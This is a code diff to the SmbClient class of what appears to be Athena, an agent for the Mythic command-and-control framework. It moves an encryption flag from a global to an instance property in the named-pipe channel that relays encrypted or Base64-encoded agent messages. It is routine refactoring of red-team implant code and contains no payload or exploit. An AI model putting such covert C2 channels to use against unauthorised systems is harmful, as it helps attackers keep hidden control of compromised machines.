@@ -50,6 +50,7 @@ namespace Athena.Config
         public NamedPipeClientStream pipeStream { get; set; }
         public PSKCrypto crypt { get; set; }
         public string uuid { get; set; }
+        public bool encrypted { get; set; }
 
         public SmbClient(string uuid)
         {
@@ -63,7 +64,7 @@ namespace Athena.Config
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
-                Globals.encrypted = true;
+                this.encrypted = true;
             }
 
             Connect(this.callbackHost, this.pipeName);
@@ -96,13 +97,13 @@ namespace Athena.Config
                 {
 
                     string json = JsonConvert.SerializeObject(obj);
-                    if (Globals.encrypted)
+                    if (this.encrypted)
                     {
                         json = this.crypt.Encrypt(json);
                     }
                     else
                     {
-                        json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                        json = Misc.Base64Encode(this.mc.MythicConfig.uuid + json);
                     }
                     DelegateMessage msg = new DelegateMessage()
                     {
@@ -121,7 +122,7 @@ namespace Athena.Config
                     
                     
                     Console.WriteLine("Received from client: {0}", temp);
-                    if (Globals.encrypted)
+                    if (this.encrypted)
                     {
                         return this.crypt.Decrypt(temp);
                     }
